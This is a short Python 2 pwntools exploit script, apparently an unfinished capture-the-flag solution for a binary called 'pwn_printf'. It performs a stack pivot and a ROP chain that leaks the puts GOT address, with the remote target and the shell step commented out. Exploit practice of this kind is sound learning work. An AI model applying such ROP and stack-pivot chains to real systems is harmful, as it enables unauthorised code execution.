from pwn import *
print str(u32('1'*4))
print ord('1')
print str(0x4007ed)
print len([1,1,1])


#!/usr/bin/python
#coding=utf-8
from pwn import *
# context.terminal = ['gnome-terminal','-x','sh','-c']
context.binary = "./pwn_printf"
context.log_level = 'debug'
p = process("./pwn_printf")
# p = remote('47.111.96.55','54406')
elf = ELF("./pwn_printf")
main_addr = 0x4007EF
leave_ret = 0x4007ed
pop_rdi = 0x401213
arr = [0xdeed, pop_rdi, elf.got['puts'], elf.plt['puts'], main_addr]
p.recvuntil('You will find this game very interesting\n')
for i in range(16):
	p.sendline(str(i))
payload = p64(0x600000)+p64(main_addr)
# gdb.attach(p)
p.send(payload)
p.recvuntil('You will find this game very interesting\n')
# p.recvuntil('You will find this game very interesting\n')
for i in arr:
	p.sendline(str(i))
for i in range(16-len(arr)):
	p.sendline(str(i))
payload = p64(0x400e000)+p64(leave_ret)

p.send(payload)
p.recv()
# for i in range(16):
# 	p.sendline(str(i))
# # payload = p64(0xdeedbeef)+p64(main_addr)
# payload = p64(0x600000)+p64(main_addr)
# p.send(payload)
# p.recvuntil('You will find this game very interesting\n')
# puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
# info(hex(puts_addr))
# p.interactive()